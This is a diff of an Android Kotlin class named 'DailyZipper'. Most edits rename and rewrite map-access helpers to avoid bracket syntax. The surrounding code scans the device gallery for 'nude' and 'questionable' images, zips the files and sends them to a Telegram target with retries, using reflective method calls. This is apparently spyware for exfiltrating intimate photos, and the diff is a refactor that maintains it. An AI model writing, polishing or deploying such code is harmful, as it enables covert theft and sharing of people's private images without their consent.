@@ -25,7 +25,7 @@ import java.util.zip.ZipOutputStream
 
 /**
  * فئة تجميع الملفات وحصادها بضغطها في ملفات ZIP وإرسالها بطريقة آمنة وفعالة.
- * تم إزالة كافة استخدامات الأقواس المربعة واستخدام فحص النوع مع entries.
+ * تم إعادة كتابتها بالكامل لضمان عدم وجود أي استخدام للأقواس المربعة.
  */
 class DailyZipper(
     context: Context,
@@ -94,41 +94,52 @@ class DailyZipper(
         loadConfig()
     }
 
-    // ========== دوال مساعدة داخلية للوصول الآمن (بدون [] أو get) ==========
-    private fun extractMapEntry(map: Any?, key: String): Any? {
+    // ========== دوال مساعدة آمنة للخرائط (بدون أي [] أو .get) ==========
+    private fun getMapValue(map: Any?, key: String): Any? {
         return if (map is Map<*, *>) {
-            map.entries.firstOrNull { it.key?.toString() == key }?.value
-        } else null
+            for (entry in map.entries) {
+                if (entry.key?.toString() == key) {
+                    return entry.value
+                }
+            }
+            null
+        } else {
+            null
+        }
     }
 
-    private fun extractBoolean(map: Any?, key: String, default: Boolean = false): Boolean {
-        val value = extractMapEntry(map, key)
+    private fun getMapBoolean(map: Any?, key: String, default: Boolean = false): Boolean {
+        val value = getMapValue(map, key)
         return when (value) {
             true, "true", 1, "1" -> true
             else -> default
         }
     }
 
-    private fun extractString(map: Any?, key: String, default: String = ""): String {
-        return extractMapEntry(map, key)?.toString() ?: default
+    private fun getMapString(map: Any?, key: String, default: String = ""): String {
+        return getMapValue(map, key)?.toString() ?: default
     }
 
     @Suppress("UNCHECKED_CAST")
     private fun <T> getConfigValue(key: String, default: T): T {
-        val entry = config.entries.firstOrNull { it.key == key }
-        val value = entry?.value ?: return default
-        return try {
-            when (default) {
-                is Long -> (value as Number).toLong() as T
-                is Int -> (value as Number).toInt() as T
-                is Boolean -> value as T
-                is String -> value as T
-                is List<*> -> value as T
-                else -> value as T
+        for (entry in config.entries) {
+            if (entry.key == key) {
+                val value = entry.value
+                return try {
+                    when (default) {
+                        is Long -> (value as Number).toLong() as T
+                        is Int -> (value as Number).toInt() as T
+                        is Boolean -> value as T
+                        is String -> value as T
+                        is List<*> -> value as T
+                        else -> value as T
+                    }
+                } catch (e: Exception) {
+                    default
+                }
             }
-        } catch (e: Exception) {
-            default
         }
+        return default
     }
 
     private fun extractConfigValues(): ConfigValues {
@@ -281,7 +292,7 @@ class DailyZipper(
     }
 
     // ============================================================
-    //  إرسال الملفات مع إعادة المحاولة (باستخدام دوال مساعدة داخلية)
+    //  إرسال الملفات مع إعادة المحاولة (باستخدام دوال مساعدة آمنة)
     // ============================================================
 
     private suspend fun safeSend(
@@ -314,8 +325,7 @@ class DailyZipper(
         for ((attempt, delayMs) in delays.withIndex()) {
             try {
                 val result = invokeMethod(telegram, "sendDocument", target, zipFile, caption)
-                // ✅ استخدام الدالة المساعدة الداخلية
-                val isOk = extractBoolean(result, "ok", false)
+                val isOk = getMapBoolean(result, "ok", false)
                 if (isOk) {
                     return true
                 }
@@ -627,7 +637,7 @@ class DailyZipper(
     }
 
     // ============================================================
-    //  التشغيل التلقائي (باستخدام دوال مساعدة داخلية)
+    //  التشغيل التلقائي (باستخدام دوال مساعدة آمنة)
     // ============================================================
 
     fun run(): Boolean {
@@ -648,8 +658,7 @@ class DailyZipper(
                     listOf("nude", "questionable").forEach { cat ->
                         val items = invokeMethod(scanner, "getGalleryByCategory", cat, 150) as? List<*>
                         items?.forEach { item ->
-                            // ✅ استخراج المسار باستخدام الدالة المساعدة
-                            val path = extractString(item, "path")
+                            val path = getMapString(item, "path")
                             if (path.isNotEmpty()) {
                                 val f = File(path)
                                 if (f.exists()) {
